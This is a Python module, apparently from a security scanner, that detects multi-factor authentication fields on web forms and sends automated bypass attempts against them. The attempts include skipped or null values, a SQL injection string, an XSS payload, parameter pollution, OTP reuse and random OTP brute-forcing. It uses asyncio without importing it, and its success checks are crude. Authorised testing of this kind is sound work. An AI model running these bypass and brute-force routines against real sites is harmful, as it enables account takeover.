"""
MFA Testing Module

This module provides functionality to test Multi-Factor Authentication (MFA)
mechanisms, including OTP field detection, MFA validation, and bypass techniques.
"""

import re
import time
import random
import string
from enum import Enum, auto
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any, Union, Set

import aiohttp
from bs4 import BeautifulSoup

class MFAStatus(Enum):
    """Status of MFA verification."""
    NOT_DETECTED = auto()
    DETECTED = auto()
    BYPASSED = auto()
    FAILED = auto()

class MFAType(Enum):
    """Types of MFA mechanisms."""
    TOTP = "totp"
    HOTP = "hotp"
    SMS = "sms"
    EMAIL = "email"
    PUSH = "push"
    WEBAUTHN = "webauthn"
    BACKUP_CODES = "backup_codes"
    UNKNOWN = "unknown"

@dataclass
class MFAField:
    """Represents an MFA input field."""
    name: str
    field_type: str
    required: bool = True
    max_length: Optional[int] = 6  # Default for OTP codes
    pattern: Optional[str] = None
    detected_type: MFAType = MFAType.UNKNOWN

@dataclass
class MFAResult:
    """Result of MFA testing."""
    status: MFAStatus
    mfa_type: MFAType
    fields: List[MFAField] = field(default_factory=list)
    bypass_attempted: bool = False
    bypass_successful: bool = False
    details: Dict[str, Any] = field(default_factory=dict)

class MFATester:
    """MFA Testing module for detecting and testing MFA implementations."""
    
    # Common MFA field patterns
    OTP_PATTERNS = {
        r'(?i)otp': MFAType.TOTP,
        r'(?i)totp': MFAType.TOTP,
        r'(?i)hotp': MFAType.HOTP,
        r'(?i)verification.?code': MFAType.TOTP,
        r'(?i)auth.?code': MFAType.TOTP,
        r'(?i)mfa.?code': MFAType.TOTP,
        r'(?i)2fa.?code': MFAType.TOTP,
        r'(?i)sms': MFAType.SMS,
        r'(?i)text': MFAType.SMS,
        r'(?i)phone': MFAType.SMS,
        r'(?i)email': MFAType.EMAIL,
        r'(?i)push': MFAType.PUSH,
        r'(?i)webauthn': MFAType.WEBAUTHN,
        r'(?i)security.?key': MFAType.WEBAUTHN,
        r'(?i)backup.?code': MFAType.BACKUP_CODES,
        r'(?i)recovery.?code': MFAType.BACKUP_CODES,
    }
    
    # Common bypass techniques
    BYPASS_TECHNIQUES = [
        "skip_parameter",
        "empty_value",
        "null_value",
        "true_value",
        "false_value",
        "zero_value",
        "negative_value",
        "large_value",
        "special_chars",
        "sql_injection",
        "xss_payload",
        "parameter_pollution"
    ]
    
    def __init__(self, session: Optional[aiohttp.ClientSession] = None):
        """Initialize the MFA tester.
        
        Args:
            session: Optional aiohttp client session
        """
        self.session = session or aiohttp.ClientSession()
    
    async def detect_mfa_fields(self, url: str, html_content: str) -> MFAResult:
        """Detect MFA-related input fields in HTML content.
        
        Args:
            url: The URL where the HTML was fetched from
            html_content: The HTML content to analyze
            
        Returns:
            MFAResult with detected MFA fields
        """
        result = MFAResult(
            status=MFAStatus.NOT_DETECTED,
            mfa_type=MFAType.UNKNOWN,
            fields=[]
        )
        
        soup = BeautifulSoup(html_content, 'html.parser')
        forms = soup.find_all('form')
        
        if not forms:
            return result
        
        for form in forms:
            inputs = form.find_all(['input', 'select', 'textarea'])
            for input_elem in inputs:
                field_name = input_elem.get('name', '').lower()
                field_type = input_elem.get('type', 'text').lower()
                field_id = input_elem.get('id', '').lower()
                field_placeholder = input_elem.get('placeholder', '').lower()
                
                # Check if this is likely an MFA field
                mfa_type = self._identify_mfa_field(
                    field_name, 
                    field_type, 
                    field_id, 
                    field_placeholder
                )
                
                if mfa_type != MFAType.UNKNOWN:
                    result.status = MFAStatus.DETECTED
                    result.mfa_type = mfa_type
                    
                    field = MFAField(
                        name=field_name,
                        field_type=field_type,
                        detected_type=mfa_type,
                        max_length=input_elem.get('maxlength'),
                        pattern=input_elem.get('pattern')
                    )
                    result.fields.append(field)
        
        return result
    
    def _identify_mfa_field(self, name: str, field_type: str, 
                          field_id: str, placeholder: str) -> MFAType:
        """Identify if a field is likely an MFA field and its type."""
        # Check field name patterns
        for pattern, mfa_type in self.OTP_PATTERNS.items():
            if (re.search(pattern, name) or 
                re.search(pattern, field_id) or 
                re.search(pattern, placeholder)):
                return mfa_type
        
        # Check for numeric input fields with specific lengths (common for OTP)
        if field_type in ['number', 'tel', 'text']:
            if (re.search(r'\d', name) or 
                re.search(r'code', name) or 
                re.search(r'verif', name)):
                return MFAType.TOTP
        
        return MFAType.UNKNOWN
    
    async def test_mfa_bypass(self, url: str, form_data: Dict[str, str], 
                            mfa_fields: List[MFAField]) -> MFAResult:
        """Test various MFA bypass techniques.
        
        Args:
            url: The form submission URL
            form_data: The form data to submit
            mfa_fields: List of MFA fields to test
            
        Returns:
            MFAResult with bypass test results
        """
        result = MFAResult(
            status=MFAStatus.DETECTED,
            mfa_type=mfa_fields[0].detected_type if mfa_fields else MFAType.UNKNOWN,
            fields=mfa_fields,
            bypass_attempted=True
        )
        
        if not mfa_fields:
            result.status = MFAStatus.NOT_DETECTED
            return result
        
        # Test each bypass technique
        for field in mfa_fields:
            for technique in self.BYPASS_TECHNIQUES:
                test_data = form_data.copy()
                
                if technique == "skip_parameter":
                    # Try submitting without the MFA field
                    test_data.pop(field.name, None)
                elif technique == "empty_value":
                    test_data[field.name] = ""
                elif technique == "null_value":
                    test_data[field.name] = "null"
                elif technique == "true_value":
                    test_data[field.name] = "true"
                elif technique == "false_value":
                    test_data[field.name] = "false"
                elif technique == "zero_value":
                    test_data[field.name] = "0"
                elif technique == "negative_value":
                    test_data[field.name] = "-1"
                elif technique == "large_value":
                    test_data[field.name] = "9" * 20
                elif technique == "special_chars":
                    test_data[field.name] = "!@#$%^&*()_+{}\\|:<>?\""
                elif technique == "sql_injection":
                    test_data[field.name] = "' OR '1'='1"
                elif technique == "xss_payload":
                    test_data[field.name] = "<script>alert(1)</script>"
                elif technique == "parameter_pollution":
                    # Try submitting the parameter multiple times
                    test_data = {**test_data, f"{field.name}[1]": "123456"}
                
                # Submit the test request
                try:
                    async with self.session.post(url, data=test_data) as response:
                        if response.status == 200:
                            # Check if we were redirected to a success page
                            if self._is_bypass_successful(await response.text()):
                                result.status = MFAStatus.BYPASSED
                                result.bypass_successful = True
                                result.details["bypass_technique"] = technique
                                result.details["status_code"] = response.status
                                return result
                except Exception as e:
                    result.details["error"] = str(e)
        
        return result
    
    def _is_bypass_successful(self, response_text: str) -> bool:
        """Determine if an MFA bypass was successful based on the response."""
        # Check for common success indicators
        success_indicators = [
            r'(?i)welcome',
            r'(?i)dashboard',
            r'(?i)success',
            r'(?i)logged in',
            r'(?i)authentication successful',
            r'(?i)redirect',
            r'(?i)location: ',  # HTTP header in raw response
            r'(?i)window\.location',  # JavaScript redirect
            r'(?i)meta.*http-equiv="refresh"'  # Meta refresh
        ]
        
        for pattern in success_indicators:
            if re.search(pattern, response_text):
                return True
        
        return False
    
    async def test_otp_reuse(self, url: str, form_data: Dict[str, str], 
                           mfa_field: str, num_attempts: int = 5) -> bool:
        """Test if the same OTP code can be reused multiple times.
        
        Args:
            url: The form submission URL
            form_data: The form data including a valid OTP code
            mfa_field: The name of the MFA field
            num_attempts: Number of times to try reusing the code
            
        Returns:
            bool: True if the OTP code can be reused, False otherwise
        """
        if mfa_field not in form_data:
            return False
            
        valid_code = form_data[mfa_field]
        success_count = 0
        
        for _ in range(num_attempts):
            try:
                async with self.session.post(url, data=form_data) as response:
                    if response.status == 200 and self._is_bypass_successful(await response.text()):
                        success_count += 1
            except Exception:
                pass
            
            # Add a small delay between attempts
            await asyncio.sleep(1)
        
        # If we succeeded more than once with the same code, it's likely reusable
        return success_count > 1
    
    async def test_otp_bruteforce(self, url: str, form_data: Dict[str, str], 
                                mfa_field: str, num_attempts: int = 10) -> bool:
        """Test if the MFA is vulnerable to brute force attacks.
        
        Args:
            url: The form submission URL
            form_data: The form data with placeholders for the MFA code
            mfa_field: The name of the MFA field
            num_attempts: Number of attempts to make
            
        Returns:
            bool: True if any brute force attempt was successful
        """
        if mfa_field not in form_data:
            return False
            
        for _ in range(num_attempts):
            # Generate a random 6-digit code
            test_code = ''.join(random.choices(string.digits, k=6))
            test_data = form_data.copy()
            test_data[mfa_field] = test_code
            
            try:
                async with self.session.post(url, data=test_data) as response:
                    if response.status == 200 and self._is_bypass_successful(await response.text()):
                        return True
            except Exception:
                pass
            
            # Add a small delay between attempts
            await asyncio.sleep(0.5)
        
        return False
    
    async def close(self) -> None:
        """Close the HTTP session."""
        if self.session and not self.session.closed:
            await self.session.close()
    
    async def __aenter__(self):
        """Async context manager entry."""
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        await self.close()

# Helper function for testing MFA bypass
def is_mfa_bypass_possible(response_text: str) -> bool:
    """Check if an MFA bypass is possible based on the response.
    
    Args:
        response_text: The response text to analyze
        
    Returns:
        bool: True if an MFA bypass is possible, False otherwise
    """
    # Check for common MFA bypass indicators
    bypass_indicators = [
        r'(?i)insufficient.*privileges',
        r'(?i)not authorized',
        r'(?i)access denied',
        r'(?i)invalid.*token',
        r'(?i)invalid.*code',
        r'(?i)expired',
        r'(?i)try again',
        r'(?i)too many attempts',
        r'(?i)rate limit',
        r'(?i)throttl',
        r'(?i)blocked',
        r'(?i)error',
        r'(?i)incorrect',
        r'(?i)failed'
    ]
    
    # If none of the error indicators are present, bypass might be possible
    return not any(re.search(pattern, response_text) for pattern in bypass_indicators)
